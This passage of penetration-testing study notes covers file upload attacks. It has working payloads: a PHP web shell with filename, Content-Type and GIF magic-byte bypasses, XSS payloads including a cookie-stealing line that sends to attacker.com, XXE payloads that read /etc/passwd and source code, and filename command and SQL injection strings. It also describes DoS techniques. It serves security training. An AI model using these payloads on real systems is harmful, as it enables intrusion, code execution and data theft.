| Carriage return + newline | `%0d0a` | Combined line ending may confuse parsers |
| Forward slash | `/` | May be interpreted as a directory separator |
| Backslash + period | `.\` | Windows path separator that may confuse parsers |
| Period | `.` | Trailing dot (Windows ignores trailing dots in filenames) |
| Ellipsis | `…` | May confuse multi-byte parsers |
| Colon | `:` | Windows Alternate Data Stream separator |

**Example — Null byte injection (PHP < 5.5):**

Filename: `shell.php%00.jpg`

- The server receives the filename with `%00` (null byte) before `.jpg`
- The back-end processes the filename: PHP sees `shell.php` + null byte + `.jpg`
- In C-based string functions (used internally), the null byte terminates the string
- The file is stored as `shell.php` (null byte + `.jpg` is ignored)
- The whitelist only saw `.jpg` and allowed it
- The stored file is `shell.php` which PHP executes

**Example — Windows colon injection:**

Filename: `shell.aspx:.jpg`

- Windows treats `:` as an Alternate Data Stream separator
- The actual file written is `shell.aspx` (the `:jpg` part creates an ADS or is truncated)
- The whitelist saw `.jpg` and allowed it

**Automating Character Injection with a bash script:**

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

**Script Breakdown:**
- `for char in '%20' '%0a' '%00' ...` — Outer loop: iterates over each special character to inject
- `for ext in '.php' '.phps'` — Inner loop: iterates over PHP extensions to embed
- **Four echo lines per combination** — generates four permutations of where the character and extension can be placed relative to `.jpg`:
  - `shell<char><ext>.jpg` — char+extension before the whitelist extension
  - `shell<ext><char>.jpg` — extension+char before the whitelist extension
  - `shell.jpg<char><ext>` — char+extension after the whitelist extension
  - `shell.jpg<ext><char>` — extension+char after the whitelist extension
- `>> wordlist.txt` — Appends each generated filename to the wordlist file (doesn't overwrite — adds to it)

**Using the wordlist:** Run a Burp Intruder scan with this custom wordlist, fuzzing the `filename` field in the upload request. Any filename that uploads successfully AND executes PHP when visited is a successful bypass.

**Exercise:** Add more PHP extensions (e.g., `.phtml`, `.phar`, `.php5`) to the `ext` loop to generate more permutations, then run the full fuzzing scan.

---

## Type Filters

File extension validation alone (blacklist or whitelist) is not sufficient to prevent file upload attacks. As demonstrated in previous sections, extension bypasses like double extensions or non-blacklisted extensions can still lead to PHP execution. This is why **many modern web servers and web applications also test the content of the uploaded file** — not just its name — to ensure it matches the expected type.

There are two common methods for validating file content:
1. **Content-Type Header** — Checks the MIME type declared in the HTTP request header
2. **MIME Type (Magic Bytes)** — Checks the actual first bytes of the file content to determine its true type

---

### Content-Type

The **Content-Type header** in an HTTP upload request declares the MIME type of the uploaded file. For example, when uploading a JPEG image, the browser automatically sets `Content-Type: image/jpeg`. A web application can check this header value to determine the file type.

**Example of a PHP Content-Type validation:**

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

**Code Breakdown:**
- `$_FILES['uploadFile']['type']` — Gets the Content-Type value from the `$_FILES` superglobal, which is populated from the uploaded file's `Content-Type` header in the HTTP request
- `in_array($type, array(...))` — Checks if the declared type is in the allowed types array: `image/jpg`, `image/jpeg`, `image/png`, `image/gif`
- If the type is not in the allowed list, upload is rejected

**The Flaw:** The Content-Type header is set by the **browser** (client-side) when uploading a file — and since it is a client-side value, **we can change it**. The server is trusting our declared type rather than verifying the actual file content. This makes Content-Type validation a client-side check masquerading as a server-side check.

**Fuzzing for allowed Content-Types:**

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

**Command Breakdown:**
- `wget <url>` — Downloads the file at the specified URL to the current directory. This downloads a comprehensive list of all known Content-Type values from SecLists on GitHub
- `cat web-all-content-types.txt` — Outputs the full content of the downloaded file
- `| grep 'image/'` — Filters the output to only include lines containing `image/` (image MIME types)
- `> image-content-types.txt` — Writes the filtered output to a new file called `image-content-types.txt`

This reduces approximately 700 content types down to about 45 image-specific types, which we can fuzz against the upload endpoint using Burp Intruder.

**Bypass — Change the Content-Type header manually:**

Intercept the upload request in Burp Suite. Our upload request for `shell.php` will have `Content-Type: application/x-php` (or similar). Change it to `Content-Type: image/jpg`:

The HTTP request now declares the file as a JPEG image while the file content is still our PHP web shell. The server checks the Content-Type header, sees `image/jpg`, considers it a valid image, and allows the upload.

**Result:** File successfully uploaded.

**Visit the shell:**

```
http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
```

**Output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Important Note:** A file upload HTTP request has **two Content-Type headers**:
1. **Main request Content-Type** — At the top of the request (e.g., `Content-Type: multipart/form-data; boundary=...`)
2. **File Content-Type** — Within the multipart body, specific to the uploaded file (e.g., `Content-Type: image/png`)

We typically need to modify the **file's Content-Type header** (the inner one). In some cases where the upload content is sent as raw POST data (not multipart), only the main Content-Type header exists and must be modified.

---

### MIME-Type

**MIME (Multipurpose Internet Mail Extensions) type** validation is more robust than Content-Type header checking because it inspects the **actual content of the file** rather than trusting the declared header. This is done by reading the **first few bytes** of the uploaded file — known as the **File Signature** or **Magic Bytes** — which identify the true file format.

**How Magic Bytes work:**

Every file type has a characteristic byte sequence at the beginning of its content:

| File Type | Magic Bytes (Hex) | Magic Bytes (ASCII) |
|---|---|---|
| GIF87a image | `47 49 46 38 37 61` | `GIF87a` |
| GIF89a image | `47 49 46 38 39 61` | `GIF89a` |
| JPEG image | `FF D8 FF` | (non-printable) |
| PNG image | `89 50 4E 47 0D 0A 1A 0A` | `\x89PNG\r\n\x1a\n` |
| ZIP archive | `50 4B 03 04` | `PK..` |
| PDF document | `25 50 44 46` | `%PDF` |

The `file` command on Linux identifies a file's type by reading its magic bytes — ignoring the file extension entirely.

**Demonstrating magic bytes with the `file` command:**

**Create a text file with a .jpg extension:**

```bash
echo "this is a text file" > text.jpg
file text.jpg
```

**Command Breakdown:**
- `echo "this is a text file" > text.jpg` — Creates a file named `text.jpg` with plain text content
- `file text.jpg` — Uses the `file` command to determine the file type by reading its content (not its extension)

**Output:**

```
text.jpg: ASCII text
```

Despite having a `.jpg` extension, the file is identified as ASCII text because it contains no JPEG magic bytes.

**Now change the content to GIF magic bytes:**

```bash
echo "GIF8" > text.jpg
file text.jpg
```

**Output:**

```
text.jpg: GIF image data
```

Just by adding `GIF8` at the start of the file (the common prefix of both GIF87a and GIF89a magic bytes), the `file` command now identifies it as a GIF image — even though the extension is `.jpg` and the rest of the content is just text. This is how MIME-type checking works: **the magic bytes define the type, not the extension**.

**Example of PHP MIME-type validation:**

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

**Code Breakdown:**
- `$_FILES['uploadFile']['tmp_name']` — Gets the path to the **temporary file** that PHP stored the upload in on the server's disk (PHP temporarily stores uploaded files before the script processes them)
- `mime_content_type()` — PHP's built-in function that reads the magic bytes of the specified file and returns its MIME type (e.g., `image/gif`, `text/plain`). This is server-side content inspection — not relying on the client's declared Content-Type
- The rest of the check is the same as before: only image MIME types are allowed

**Bypass — Prepend GIF magic bytes to the PHP shell:**

Since `mime_content_type()` checks the first bytes, we just need our file to **start with valid image magic bytes**. We add `GIF8` before our PHP code:

```
GIF8
<?php system($_REQUEST['cmd']); ?>
```

When `mime_content_type()` reads this file, it sees `GIF8` → identifies it as a GIF image → allows the upload.

When PHP's `include()` or direct execution processes the file:
- `GIF8` is treated as text/output (printed as `GIF8` before the command output)
- `<?php system($_REQUEST['cmd']); ?>` is executed as PHP code

**In Burp Suite — Modify the file content:**

In the intercepted upload request body, change the file content to:

```
GIF8
<?php system($_REQUEST['cmd']); ?>
```

Keep the filename as `shell.php` (so PHP executes it) and send the request.

**Result:** File successfully uploaded.

**Visit the shell:**

```
http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
```

**Output:**

```
GIF8
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `GIF8` appears first (the magic bytes are treated as text output), followed by the `id` command output. We successfully bypassed MIME-type validation.

**Note:** Why GIF specifically? Because GIF magic bytes (`GIF8`) are **ASCII-printable characters** — easy to type directly in Burp's request body. JPEG and PNG magic bytes include non-printable binary characters that would require hex editing or special tools to insert. GIF is simply the most convenient format for this attack.

**Combining Techniques:**
We can combine multiple bypass methods to defeat more robust filters. For example:
- **Allowed MIME type + disallowed Content-Type** with a disallowed extension
- **Allowed MIME/Content-Type** with a disallowed extension (bypassing both MIME and Content-Type checks)
- **Disallowed MIME/Content-Type** with an allowed extension and magic bytes
- Various combinations and permutations to confuse the web server's validation logic

Experimenting with different combinations is often necessary to bypass layered security controls.

---

## Limited File Uploads

In many cases, upload forms have more secure filters that cannot be bypassed using the techniques discussed so far. However, even if we cannot achieve arbitrary file uploads (i.e., upload and execute a PHP shell), **certain file types that are allowed can still be weaponized** to introduce vulnerabilities into the web application or attack users of the application.

File types like **SVG**, **HTML**, **XML**, and even some **image and document files** (PDF, Word, PowerPoint) may allow us to introduce new vulnerabilities by uploading maliciously crafted versions of them. This is why **fuzzing allowed file extensions** is always an important early step — to understand the full attack surface even when direct RCE is not immediately achievable.

---

### XSS

**Cross-Site Scripting (XSS)** via file upload can occur in multiple ways. The basic principle: if an allowed file type can contain JavaScript or be rendered in a browser, we may be able to embed an XSS payload in it that executes when a user views or interacts with the file.

**Method 1 — Uploading malicious HTML files:**

If the web application allows uploading HTML files, we can craft an HTML file containing a JavaScript payload:

```html
<script>alert(window.origin);</script>
```

When a victim visits the link to the uploaded HTML file, the browser renders and executes the JavaScript. This can be used for:
- XSS to steal cookies: `document.location='http://attacker.com/steal?c='+document.cookie`
- CSRF (Cross-Site Request Forgery) attacks
- Keyloggers, form hijackers, and other client-side attacks

**Method 2 — XSS in image metadata (EXIF data):**

Some web applications display an image's metadata (EXIF data) after upload — for example, showing the camera model, location, or photographer name. If we inject an XSS payload into the EXIF metadata and the application displays it unsanitized, the JavaScript executes.

**Injecting XSS into the `Comment` EXIF field:**

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

**Command Breakdown:**
- `exiftool` — A powerful Perl-based tool for reading and writing metadata (EXIF, IPTC, XMP) in image and other media files
- `-Comment='...'` — Sets the `Comment` EXIF metadata field to our XSS payload
- `"><img src=1 onerror=alert(window.origin)>` — The XSS payload. It closes any surrounding HTML attributes with `"` and `>`, then injects an `<img>` tag with an invalid `src=1` that triggers the `onerror` JavaScript event, which calls `alert(window.origin)` to show the domain
- `HTB.jpg` — The target JPEG file to inject the metadata into

**Verify the injection:**

```bash
exiftool HTB.jpg
```

**Command Breakdown:**
- `exiftool HTB.jpg` — Reads and displays all metadata from `HTB.jpg`
- Look for the `Comment` field in the output to confirm our payload was written

**Expected Output:**

```
...SNIP...
Comment: "><img src=1 onerror=alert(window.origin)>
```

When the web application displays this image's metadata, the XSS payload is rendered as HTML and the JavaScript alert fires. Furthermore, if we change the image's MIME-Type to `text/html`, some web applications may render the file as HTML instead of an image, triggering the XSS even if metadata is not displayed.

**Method 3 — XSS in SVG files:**

SVG (Scalable Vector Graphics) images are **XML-based** — they describe vector graphics using XML tags. Since SVG is XML, we can embed JavaScript directly inside the SVG:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

**SVG Code Breakdown:**
- `<?xml version="1.0" encoding="UTF-8"?>` — XML declaration specifying the version and character encoding
- `<!DOCTYPE svg ...>` — Document type declaration linking to the official SVG DTD schema
- `<svg xmlns="...">` — Root SVG element with the XML namespace
- `<rect .../>` — Draws a 1x1 green rectangle (minimal visible content to make it a valid SVG)
- `<script type="text/javascript">alert(window.origin);</script>` — Embeds JavaScript directly inside the SVG. When the browser renders this SVG, it executes the script. `window.origin` outputs the current domain.

Upload this SVG as the profile image. When any user (victim) views the page that displays this image, their browser renders the SVG and executes the embedded JavaScript — triggering the XSS. This is a **Stored XSS** attack because the malicious payload is permanently stored on the server.

---

### XXE

**XML External Entity (XXE)** attacks exploit XML parsers that process external entity references. SVG files (being XML-based) can carry XXE payloads. When the server parses the SVG's XML data (e.g., to resize it, generate thumbnails, or display it), the XXE payload is triggered server-side — potentially reading sensitive files.

**XXE payload to read `/etc/passwd` via SVG:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

**SVG/XML Breakdown:**
- `<?xml version="1.0" encoding="UTF-8"?>` — XML declaration
- `<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` — Defines a DOCTYPE with an **external entity** named `xxe`. The `SYSTEM` keyword tells the XML parser to load the entity's content from an external source — in this case, `file:///etc/passwd` (the Linux password file using the file:// URI scheme)
- `<svg>&xxe;</svg>` — The SVG body references the `xxe` entity with `&xxe;`. When the XML parser processes this, it substitutes `&xxe;` with the content of `/etc/passwd`

When the server parses this SVG (for display, thumbnail generation, etc.), the XML parser reads `/etc/passwd` and inserts its content into the SVG. The file contents are returned in the page or page source — exposing all user accounts on the system.

**XXE payload to read PHP source code:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

**Breakdown:**
- `php://filter/convert.base64-encode/resource=index.php` — Uses PHP's filter wrapper (same as in LFI) to base64-encode the content of `index.php` before including it
- The base64-encoded source code of `index.php` appears in the SVG output
- Decode it with `echo '<base64>' | base64 -d` to get the original source

This is extremely valuable for whitebox analysis: reading source code reveals the upload directory, allowed extensions, file naming scheme, and other vulnerabilities to exploit.

**XXE in other document types:**

XXE is not exclusive to SVG. Other document types that contain XML internally:
- **PDF** — Uses XML-based metadata
- **Word Documents (.docx)** — DOCX is a ZIP archive containing XML files
- **PowerPoint (.pptx)** — Also XML-based internally
- **Excel (.xlsx)** — Also XML-based

If the web application has a document viewer that is vulnerable to XXE and allows uploading these document types, we can modify their internal XML data to include malicious XXE elements and achieve blind XXE attacks (data exfiltration without direct output).

Similarly, XXE can be chained into **SSRF (Server-Side Request Forgery)** by using external entity URLs pointing to internal services:

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
```

This can enumerate internal ports and call private APIs.

---

### DoS

**Denial of Service (DoS)** attacks via file uploads target the server's resources — CPU, memory, disk space, or network — to crash or significantly slow down the back-end server. These do not require code execution; they abuse the server's file processing functionality.

**Attack 1 — Decompression Bomb (ZIP Bomb):**

If the web application automatically unzips uploaded ZIP archives (e.g., to process them or extract files), a **decompression bomb** can be devastating. A decompression bomb is a ZIP file containing nested ZIP archives. When unzipped recursively, the total decompressed data expands to petabytes — far exceeding the server's available disk space or memory and causing a crash.

For example: a 1 KB ZIP file may decompress to 1 PB of data when fully extracted (using highly compressed repeated data and nested archives).

**Attack 2 — Pixel Flood Attack (Image Files):**

Some image formats (JPG, PNG) store their dimensions in the file header. A pixel flood attack creates a normal-looking image file (e.g., 500x500 pixels) but manually edits the dimension values in the compression data to claim a much larger size (e.g., `0xffff x 0xffff` = 65535 x 65535 pixels = ~4.3 gigapixels).

When the web application tries to display or process the image (resize, thumbnail, render), it tries to **allocate memory for 4.3 billion pixels** — exhausting all available RAM and causing the server to crash.

**How to create a pixel flood JPG:**
- Start with any legitimate JPG
- Use a hex editor to change the width/height bytes in the JFIF or SOF header to `0xFF 0xFF` (maximum value)
- The file looks valid but reports a massive resolution

**Attack 3 — Oversized File Upload:**

Some upload forms do not limit the **file size** or do not check size before accepting the upload. Uploading an extremely large file (e.g., several GB) can:
- Fill the server's hard disk → server crashes or becomes unresponsive
- Exhaust server memory during processing
- Saturate network bandwidth

**Attack 4 — Directory Traversal in File Name:**

If the upload function is vulnerable to **directory traversal** in the filename (e.g., `filename="../../../etc/passwd"`), we may upload files to unexpected locations — potentially overwriting critical system files, causing the server to malfunction or crash.

**Attack 5 — XXE-based DoS:**

The XXE payloads discussed in the previous section (like billion laughs attack or recursive entity references) can exhaust the XML parser's memory and CPU, causing a DoS when the server processes the uploaded file.

---

## Other Upload Attacks

In addition to arbitrary file uploads and limited file upload attacks, there are several other techniques worth knowing that may become relevant in specific web penetration tests or bug bounty programs.

---

### Injections in File Name

A common file upload attack uses a **malicious string for the uploaded file name** itself — injecting code or commands into the filename that gets executed or processed if the web application uses the filename in an unsafe way (e.g., passing it to an OS command, displaying it in HTML, or using it in a database query).

**1. Command Injection via File Name:**

If the web application uses the uploaded file name in an OS command (e.g., to move, rename, or process the file), a malicious file name can inject additional commands:

**Malicious file names:**
- `file$(whoami).jpg` — Uses shell command substitution `$(...)`. If used in a bash command like `mv file$(whoami).jpg /tmp/`, bash evaluates `$(whoami)` and executes the `whoami` command
- `` file`whoami`.jpg `` — Backtick command substitution — same effect as `$()`
- `file.jpg||whoami` — Command chaining with `||` (OR). If the first command fails, `whoami` executes
- `file.jpg;whoami` — Command chaining with `;`. Executes `whoami` after the first command regardless of success/failure

**Example vulnerable server code (pseudo):**

```bash
mv $uploaded_file_name /var/www/html/uploads/
```

If `$uploaded_file_name` is `file$(whoami).jpg`, bash expands this to:

```bash
mv filewww-data.jpg /var/www/html/uploads/
```

And `whoami` was executed as a side effect, giving RCE.

**2. XSS via File Name:**

If the uploaded file name is displayed on the page (e.g., in a file list, download link, or notification), we can inject an XSS payload as the filename:

```
<script>alert(window.origin);</script>.jpg
```

When the application renders the filename in HTML without sanitization, the script tag executes in the victim's browser.

**3. SQL Injection via File Name:**

If the filename is inserted into a database query without parameterization:

```
file';select+sleep(5);--.jpg
```

The single quote `'` closes the string in the SQL query, and `select sleep(5)` causes a 5-second delay — confirming SQL injection. More dangerous payloads can dump the database or perform UNION-based extraction.

---

### Upload Directory Disclosure

In some file upload forms (feedback forms, submission forms), we may not have direct access to the uploaded file's URL and may not know the upload directory. Knowing the upload path is essential for including our shell via LFI or directly visiting the uploaded file.

**Method 1 — Fuzzing:**

Use tools like `ffuf` or `gobuster` to fuzz for common upload directories:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -fc 404
```

Try directories like `/uploads/`, `/files/`, `/media/`, `/images/`, `/user-files/`, `/attachments/`, etc.

**Method 2 — LFI/XXE Source Code Reading:**

As covered in the LFI and Limited File Upload sections, use LFI or XXE to read the web application's source files (like `config.php` or the main application file). The source code will typically contain the upload directory path as a configured variable or constant.

**Method 3 — Forcing Error Messages:**

Errors often reveal internal paths and directory structures. Techniques to force errors:

- **Upload a file that already exists:** If a file named `profile.jpg` is already in the uploads folder, uploading another file with the same name may cause the server to error out with a message like "Cannot write file to /var/www/html/uploads/profile.jpg" — revealing the full path
- **Send two identical requests simultaneously:** Race condition may cause a write conflict and error revealing the path
- **Upload a file with an extremely long name (e.g., 5000 characters):** If the server does not handle long names, it may throw an error disclosing the upload path

**Method 4 — IDOR (Insecure Direct Object Reference):**

The Web Attacks/IDOR module discusses techniques for finding where files are stored and identifying file naming schemes. Files may be stored with predictable names (e.g., sequential IDs, hashed usernames, timestamps) that allow enumerating other users' files.

---

### Windows-specific Attacks

When the target web application runs on a **Windows server**, several Windows-specific techniques can be applied to file uploads that exploit Windows's unique file system behaviors.

**1. Reserved Characters in File Names:**

Windows reserves certain characters for special uses in file paths. If the web application does not sanitize these characters or wrap filenames in quotes when using them in commands, they may cause unexpected behavior:

- `|` (pipe), `<` (redirect in), `>` (redirect out), `*` (wildcard), `?` (single char wildcard)

Example: uploading a file named `shell.php*` or `shell?.php` — the wildcard characters may cause the server to reference unintended files, trigger errors, or disclose path information.

**2. Windows Reserved Device Names:**

Windows reserves certain names as device identifiers that cannot be used as filenames:
`CON`, `PRN`, `AUX`, `NUL`, `COM1`–`COM9`, `LPT1`–`LPT9`

Uploading a file with these names (e.g., `NUL.php`, `CON.txt`) causes Windows to refuse the write operation, potentially triggering error messages that disclose the upload directory path or other server information.

**3. Windows 8.3 Short Filename Convention:**

Older versions of Windows (and still supported in modern Windows for legacy compatibility) used the **8.3 filename format** — 8-character filename + 3-character extension. Long filenames were abbreviated with a tilde (`~`) followed by a number.

**Format:** The first 6 characters of the long name + `~1` (or `~2` for the second matching file) + extension

**Examples:**
- `hackthebox.txt` → `HACKTH~1.TXT`
- `webshell.php` → `WEBSHE~1.PHP`
- `web.conf` → `WEB~1.CON` (if `web.config` exists)

**Attack:** Upload a file named `WEB~1.CON` to overwrite `web.conf`, or use these short names to reference existing files that we want to read or overwrite. This can lead to:
- **Information disclosure** — Errors referencing existing files reveal their names/paths
- **File overwriting** — Overwriting configuration or sensitive files
- **DoS** — Replacing critical server files causes the server to malfunction

---

### Advanced File Upload Attacks

Beyond all the attacks covered in this module, there are more **advanced file upload attacks** that involve automatic file processing performed by the server on uploaded files. Any server-side processing that occurs automatically after upload — without proper security — can be exploited.

**1. Processing Library Vulnerabilities:**

Common file processing libraries may have known public exploits:

- **ffmpeg (AVI upload → XXE)** — A widely-used video processing library. A known vulnerability allows crafting a malicious AVI video file that, when processed by ffmpeg for encoding/transcoding, triggers an XXE attack — exposing server files or performing SSRF
- **ImageMagick (ImageTragick)** — A popular image processing library with historical vulnerabilities (like CVE-2016-3714 "ImageTragick") that allowed RCE via maliciously crafted image files
- **LibreOffice document conversion** — Vulnerabilities in document conversion libraries may allow code execution via maliciously crafted DOCX/ODT files

**2. Auto-processing Attack Surface:**

Any automatic server-side action on uploaded files creates an attack surface:

- **Video encoding** — Converting uploaded videos (e.g., AVI → MP4) may use vulnerable codecs
- **Image compression/resizing** — Thumbnailing images with ImageMagick or PIL/Pillow
- **Archive extraction** — Automatically unzipping uploaded archives (ZIP/TAR) exposes to path traversal in archive entries and decompression bombs
- **File renaming** — Using the original filename in an OS command for renaming
- **Metadata stripping** — Parsing EXIF data may invoke vulnerable parsers
- **PDF processing** — Converting/rendering PDFs may invoke vulnerable readers

**3. Custom Code Vulnerabilities:**

When custom code (not a standard library) processes uploaded files, discovering vulnerabilities requires deeper analysis:
- Reverse engineering the processing logic
- Understanding what functions are called with what inputs
- Identifying where user-controlled data (like the filename or file content) flows into dangerous operations

These advanced attacks require deeper knowledge of the specific libraries and processing pipelines in use. They are typically discovered through:
- Researching CVEs for identified libraries (via Wappalyzer, headers, or source code)
- Reading bug bounty reports for similar applications
- Manual testing with intentionally malformed files targeting specific parsers

**Recommendation:** Regularly read **bug bounty reports** (HackerOne, Bugcrowd) focused on file upload vulnerabilities to stay current with advanced techniques as they are discovered in real-world applications.

---

*End of Notes — File Upload Attacks (Complete)*
